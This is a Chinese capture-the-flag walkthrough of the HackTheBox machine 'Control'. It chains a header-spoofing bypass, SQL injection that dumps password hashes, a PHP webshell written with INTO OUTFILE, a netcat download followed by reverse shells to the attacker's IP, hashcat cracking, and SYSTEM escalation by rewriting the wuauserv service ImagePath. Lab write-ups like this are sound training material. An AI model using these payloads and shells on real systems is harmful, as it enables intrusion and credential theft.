Control是一个困难的靶机，知识点涉及访问限制绕过、SQL注入、哈希破解、凭证创建、服务枚举等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2022-03-17
下午4.02.54](https://image.3001.net/images/20220322/1647933547_6239786b2bb9ec650d5a1.png!small)  
 _通关思维导图_  
![Control](https://image.3001.net/images/20220322/1647933550_6239786e135a35add6148.png!small)

## 0x01 侦查

### 端口探测

首先使用 nmap 进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.167 -oA nmap_Control
    

![截屏2022-03-17
下午4.58.24](https://image.3001.net/images/20220322/1647933551_6239786fd387df80c8b11.png!small)  
扫描结果显示目标开放了80、135、3306等端口

#### 80端口

访问站点，这是一家做 WiFi 技术公司的官网  
![截屏2022-03-18
下午12.24.13](https://image.3001.net/images/20220322/1647933555_62397873aabf2d2eae311.png!small)  
源代码中发现一段注释，包含了一个IP：192.168.4.28  
![截屏2022-03-18
下午2.11.26](https://image.3001.net/images/20220322/1647933558_6239787654bd0e54ec0d5.png!small)  
点击`Admin`跳转至`/admin.php`下，返回错误  
![截屏2022-03-18
下午2.10.46](https://image.3001.net/images/20220322/1647933560_62397878019ddd879c337.png!small)  
点击`About`跳转至`/about.php`下，其中还是关于他们公司的有关介绍  
![截屏2022-03-18
下午2.10.36](https://image.3001.net/images/20220322/1647933561_6239787952b8af8af2e1b.png!small)

## 0x02 上线[iusr]

### 代理绕过

在访问`admin.php`时页面提示`Header Missing`，是否就意味着 HTTP 请求包中的头部信息呢？因此我们找到了一个 HTTP
头部列表：`headers.txt`  
 **请求头参考：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers**  
![截屏2022-03-18
下午2.58.12](https://image.3001.net/images/20220322/1647933564_6239787c64eecdfdfedff.png!small)

使用 wfuzz 对请求头部进行模糊测试，如果无权访问 Chars 对应为89，可直接在 wfuzz 中过滤

    
    
    wfuzz -c -w headers.txt -u http://10.10.10.167/admin.php -H "FUZZ: 10.10.10.167" --hh 89
    

![截屏2022-03-18
下午2.57.57](https://image.3001.net/images/20220322/1647933565_6239787d8f1d964a1edeb.png!small)

无果后猜测可能是代理IP设置错误，将其替换成`192.168.4.28`再次进行模糊测试

    
    
    wfuzz -c -w headers.txt -u http://10.10.10.167/admin.php -H "FUZZ: 192.168.4.28" --hh 89
    

![截屏2022-03-18
下午3.02.20](https://image.3001.net/images/20220322/1647933566_6239787ebc7cd6261f82b.png!small)  
当请求头部为`X-Forwarded-For`时返回7933，说明可能已经绕过了代理。使用浏览器代理插件`modheader`定制请求头部，访问
admin.php 可成功进入控制台面板  
![截屏2022-03-18
下午3.09.01](https://image.3001.net/images/20220322/1647933567_6239787ff4147fb4ea355.png!small)

### SQL注入

在后台中创建一个名为`mac`的产品并搜索产品`mac`  
![截屏2022-03-18
下午4.00.06](https://image.3001.net/images/20220322/1647933569_623978814cde02cb7d26a.png!small)

开启 BurpSuite 修改的请求参数`mac`为`mac'`，发现其中可能存在SQL注入漏洞  
![截屏2022-03-18
下午4.01.08](https://image.3001.net/images/20220322/1647933571_623978836f7740d3a34a6.png!small)

首先判断字段数，`mac' oder by 6`显示正常，`mac' oder by 7#`报错，说明字段数为6  
![截屏2022-03-18
下午4.08.55](https://image.3001.net/images/20220322/1647933572_623978846d5f9a9f763a0.png!small)

查询数据库基础信息，包括数据库版本、用户名以及当前数据库名

    
    
    mac' union select version(),user(),database(),4,5,6#
    

![截屏2022-03-18
下午4.13.44](https://image.3001.net/images/20220322/1647933573_623978856b0177833124e.png!small)

列出全部数据库，分别为`information_schema`、`mysql`、`warehouse`

    
    
    mac' union select schema_name,2,3,4,5,6 from information_schema.schemata#
    

![截屏2022-03-18
下午4.19.26](https://image.3001.net/images/20220322/1647933574_6239788682f4670b894ac.png!small)

查询当前库所有数据表名，分别为`product`、`product_category`、`product_pack`

    
    
    mac' union select table_name,2,3,4,5,6 from information_schema.tables where table_schema='warehouse'#
    

![截屏2022-03-18
下午4.22.11](https://image.3001.net/images/20220322/1647933575_62397887d4bdf71c68f30.png!small)

继续深挖表中数据未发现有用信息，开始查询数据库用户信息

    
    
    mac' union select host,user,password,4,5,6 from mysql.user#
    

经过整理后用户名以及对应的哈希值如下

    
    
    localhost root *0A4A5CAD344718DC418035A1F4D292BA603134D8
    fidelity root *0A4A5CAD344718DC418035A1F4D292BA603134D8
    127.0.0.1 root *0A4A5CAD344718DC418035A1F4D292BA603134D8
    ::1 root *0A4A5CAD344718DC418035A1F4D292BA603134D8
    localhost manager *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA 
    localhost hector *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
    

查看个用户的权限，值得注意的是当前用户貌似只有`file`权限，而`hector`以及`root`则拥有许多特权

    
    
    mac' union select grantee,privilege_type,is_grantable,4,5,6 from information_schema.user_privileges#
    

![截屏2022-03-18
下午4.43.23](https://image.3001.net/images/20220322/1647933576_62397888c7292e6a7810c.png!small)

### 文件写入

由于当前用户具有`file`权限，也就是文件操作权限，可以尝试写入webshell，路径则为默认的 IIS 路径`C:\inetpub\wwwroot\`

    
    
    mac' union select '<?php system($_GET[\'cmd\']);?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/mac.php'#
    

![截屏2022-03-18
下午4.52.47](https://image.3001.net/images/20220322/1647933577_62397889b8f0bd3b9552d.png!small)  
出现数据库报错，但是访问`mac.php`执行 whoami 命令成功，说明 webshell 已部署完成  
![截屏2022-03-18
下午4.53.19](https://image.3001.net/images/20220322/1647933578_6239788abbbba0022d93f.png!small)

在本地开启 http 服务用于传输`nc64.exe`

    
    
    python3 -m http.server 80
    

通过 webshell 执行命令下载至`\windows\temp\`目录下

    
    
    curl '10.10.10.167/mac.php?cmd=powershell+wget+http://10.10.14.13/nc64.exe+-outfile+\windows\temp\nc.exe'
    

本地监听443端口

    
    
    nc -nvlp 443
    

执行 nc 获取反弹shell

    
    
    curl '10.10.10.167/mac.php?cmd=\windows\temp\nc.exe+-e+cmd+10.10.14.13+443'
    

![截屏2022-03-21
下午3.56.49](https://image.3001.net/images/20220322/1647933579_6239788bb027df19f8649.png!small)  
成功拿到反弹shell

## 0x03 权限提升[hector]

### 信息收集

进入`C:\Users`目录查看用户名，在其中再次发现用户`Hector`

    
    
    dir c:\Users
    

![截屏2022-03-21
下午4.44.01](https://image.3001.net/images/20220322/1647933580_6239788ca1bedd12ac0a5.png!small)  
查看该用户权限，该用户处于远程管理员组当中

    
    
    net user hector
    

![截屏2022-03-21
下午4.47.00](https://image.3001.net/images/20220322/1647933581_6239788d9711102524dc7.png!small)

查看本地端口发现5859端口开放，这也就意味着我们可以通过WinRM进行登录

    
    
    netstat -ano
    

![截屏2022-03-21
下午4.58.16](https://image.3001.net/images/20220322/1647933582_6239788ed1e105929624f.png!small)

### 哈希破解

在 mysql 数据中我们获得许多用户密码，经过整理后如下

    
    
    root:0A4A5CAD344718DC418035A1F4D292BA603134D8
    manager:CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
    hector:0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
    

尝试使用 hashcat 进行破解

    
    
    hashcat -m 300 hashes --user /usr/share/wordlists/rockyou.txt --force
    

![截屏2022-03-21
下午5.32.02](https://image.3001.net/images/20220322/1647933584_623978902b68a6c07907d.png!small)  
成功破解密码为`l33th4x0rhector`

### 凭证创建

使用 powershell 制作用户 hector 的身份凭证

    
    
    powershell
    ps > $env:ComputerName
    ps > $user = "CONTROL\hector"
    ps > $pass = "l33th4x0rhector"
    ps > $secstr = New-Object -TypeName System.Security.SecureString
    ps > $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
    ps > $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
    ps > Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
    

![截屏2022-03-22
上午1.19.01](https://image.3001.net/images/20220322/1647933585_623978913f03ae69374de.png!small)  
可以看到运行权限为 hector 身份

### 反弹shell

通过本地的 nc 完成反弹shell

    
    
    ps > Invoke-Command -ScriptBlock {\windows\temp\nc.exe -e cmd 10.10.14.13 5555 } -computer localhost
    

在本地监听5555端口

    
    
    rlwrap nc -nvlp 5555
    

但是当前访问`\windows\temp`中的 nc 被拒绝  
![截屏2022-03-22
上午1.27.50](https://image.3001.net/images/20220322/1647933586_62397892533f19fd61491.png!small)

将 nc 传输至`\winndows\system32\spool\drivers\color\`目录下并执行命令

    
    
    ps > wget 10.10.14.13/nc64.exe -outfile \windows\system32\spool\drivers\color\nc64.exe
    ps > Invoke-Command -credential $cred -ScriptBlock {\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.13 5555 } -computer localhost
    

![截屏2022-03-22
上午1.43.11](https://image.3001.net/images/20220322/1647933587_623978934d6a30acfe3fd.png!small)

成功获取用户权限，在当前用户桌面上寻找flag

    
    
    dir C:\Users\hector\Desktop
    type C:\Users\hector\Desktop\user.txt
    

![截屏2022-03-22
上午1.49.45](https://image.3001.net/images/20220322/1647933588_6239789489f80f5fd76cc.png!small)

成功拿到第一个flag

## 0x04 权限提升[system]

### 信息收集

使用 powershell 检查系统当中的历史文件

    
    
    ps > (Get-PSReadlineOption).HistorySavePath
    

![截屏2022-03-22
上午1.59.13](https://image.3001.net/images/20220322/1647933589_62397895a1267e1a05b63.png!small)

查看 powershell
历史文件后发现两个命令：第一个命令为列出注册表`CurrentControlSet`下的子键；第二个命令为获取`CurrentControlSet`的注册表项

    
    
    type C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    

![截屏2022-03-22
上午2.01.52](https://image.3001.net/images/20220322/1647933590_623978968f21d45292b16.png!small)

尝试执行第二个命令未发现可用信息

    
    
    ps > get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
    

![截屏2022-03-22
上午2.07.28](https://image.3001.net/images/20220322/1647933591_62397897975380975eb32.png!small)

### 枚举服务

但是访问其中的 Services 子键则发现当前用户对 Services
具有完全控制权限，那么这也就意味着我们可以更改系统当中服务的注册表值。服务通常存在一个图像路径，它会指定驱动程序的图像文件的完全限定路径，因此只需要通过更改服务的图像路径来生成恶意进程。

    
    
    ps > get-acl HKLM:\SYSTEM\CurrentControlSet\Services | format-list
    

![截屏2022-03-22
上午2.12.54](https://image.3001.net/images/20220322/1647933593_623978991380c7145f751.png!small)

但是如果更改服务路径就得重启服务，同时还需要确定重启哪个服务。我们将服务列表输出存储至`$services`当中

    
    
    ps > $services = gci HKLM:\SYSTEM\CurrentControlSet\Services
    ps > $services
    

![截屏2022-03-22
上午2.32.25](https://image.3001.net/images/20220322/1647933594_6239789a27f7870ee8567.png!small)

结果列表中显示了很多服务，而当前用户作为非管理员用户无法随心所欲地重启服务，因此在这么多服务当中找到可重启的服务显得有些困难。查看服务的 SDDL
权限可确认当前用户可重启的服务列表。

SDDL即安全描述符字符串，该字符串将分为四个部分，O 代表所有者，G 代表组，D 代表自由访问控制列表 (DACL)，S 代表系统访问控制列表
(SACL)，通常采用如下格式：

    
    
    O:owner_sidG:group_sidD:dacl_flags(string_ace1)(string_ace2)…(string_acen)S:sacl_flags(string_ace1)(string_ace2)…(string_acen)
    

下表包含对其中 DACL 权限的划分

ACE| User| Permissions  
---|---|---  
(A;;KA;;;AU)| 认证用户| 允许注册表完全访问  
(A;;CC;;;AU)| 认证用户| 允许目录创建子级  
(A;;CCLCRPRC;;;IU)| 交互式登录用户| 允许目录创建子级、列表、读取属性和通用读取  
(A;;CCLCRPRC;;;SU)| 服务登录用户| 允许目录创建子级、列表、读取属性和通用读取  
(A;;CCLCRPWPRC;;;SY)| 本地系统| 允许目录创建子级、列表、读取属性以及通用读取和属性写入  
(A;;KA;;;BA)| 内置管理员| 允许注册表完全访问  
  
经过测试后我们发现服务 wuauserv 满足条件

    
    
    sc sdshow wuauserv
    

![截屏2022-03-22
上午3.21.07](https://image.3001.net/images/20220322/1647933595_6239789b8f9c8ebec1cc0.png!small)

### 管理员上线

通过`reg add`修改对应服务当中的图片路径为执行命令

    
    
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.13 4444" /f
    

在本地监听4444端口

    
    
    rlwrap nc -nvlp 4444
    

通过 sc 重启服务，加载 payload

    
    
    sc.exe \\fidelity start wuauserv
    

![截屏2022-03-22
上午3.46.37](https://image.3001.net/images/20220322/1647933596_6239789c743f4b39dfb23.png!small)

由于当前shell并不稳定，因此需要执行命令获取相对稳定的shell，与此同时在本地监听6666端口

    
    
    \windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.13 6666
    

![截屏2022-03-22
上午3.47.10](https://image.3001.net/images/20220322/1647933597_6239789d998506d030660.png!small)

执行后拿到稳定的shell且权限为 system  
![截屏2022-03-22
上午3.47.18](https://image.3001.net/images/20220322/1647933598_6239789edf50aca989a38.png!small)

在管理员桌面上寻找第二个flag

    
    
    dir c:\Users\administrator\Desktop
    type c:\Users\administrator\Desktop\root.txt
    

![截屏2022-03-22
上午3.48.04](https://image.3001.net/images/20220322/1647933599_6239789fee9a1fa10eabb.png!small)

成功拿到第二个flag

 **总结：查看站点源代码发现注释中存在内网IP，在http请求头部中添加X-Forward-For为该IP即可绕过限制进入后台。经过测试我们发现后台存在SQL注入，当前数据库可获取数据库用户的哈希值以及拥有文件写入权限，写入小马至站点目录当中，执行反弹shell拿到用户权限。靶机当中包含用户hector，该用户也同样出现在数据库中，由此猜测它们的密码可能相同，使用hashcat破解后拿到明文密码，通过powershell制作用户凭证，以hector用户执行反弹shell命令，成功完成权限提升。在hector用户下存在历史命令文件，其中包含两个针对注册表CurrentControlSet的操作，查询其下的Services子键可发现hector用户对服务拥有完全控制权限，而服务中通常存在一个图像路径，将其修改为反弹shell命令，重启服务后能够以系统权限运行命令。由于当前权限不是系统管理员，我们需要寻找拥有重启权限的服务，wuauserv服务是个不错的选择，修改其图片路径并重启服务，成功拿到系统权限。**

